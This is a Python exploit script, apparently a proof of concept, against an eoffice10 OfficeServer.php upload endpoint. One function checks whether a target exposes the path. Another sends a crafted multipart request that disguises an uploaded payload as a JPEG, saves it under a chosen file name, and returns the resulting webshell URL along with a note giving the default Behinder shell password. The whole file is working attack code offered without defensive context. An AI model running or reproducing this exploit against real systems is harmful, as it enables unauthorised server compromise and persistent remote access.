
import requests
from urllib import parse


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def exp_check(url):
    try:
        path = "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
        rsp = requests.get(url=url + path,headers=headers,verify=False)
        if rsp.status_code == 200 and "404" not in rsp.text and "api" not in rsp.text:
            return 1
        else:
            return 2
    except:
        return 3

def exp_upload(url,data,shellName):
    try:
        data = parse.unquote(data)
        headers['Content-Type'] = 'multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs'
        path = "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
        payload = ('------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\n'
                    'Content-Disposition: form-data; name="FileData"; filename="1.jpg"\r\n'
                    'Content-Type: image/jpeg\r\n\r\n'
                    +data+"\r\n"
                    '------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\n'
                    'Content-Disposition: form-data; name="FormData"\r\n\r\n'
                    "{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'"+shellName+"'}\r\n"
                    '------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--'
                    )
        requests.post(url=url+path,data=payload,headers=headers,verify=False)
        shellpath = "/eoffice10/server/public/iWebOffice2015/Document/"+shellName
        headers['Content-Type'] = 'Content-Type: application/x-www-form-urlencoded'
        rp = requests.get(url=url+shellpath,headers=headers,verify=False)
        if rp.status_code == 200 and rp.text == "" and "404" not in rp.text:
            return ("webshell 如下：\r\n"
                    +url+shellpath+"\r\n如使用默认得码子为冰蝎码：rebeyond"
                    )
    except:
        return 3
    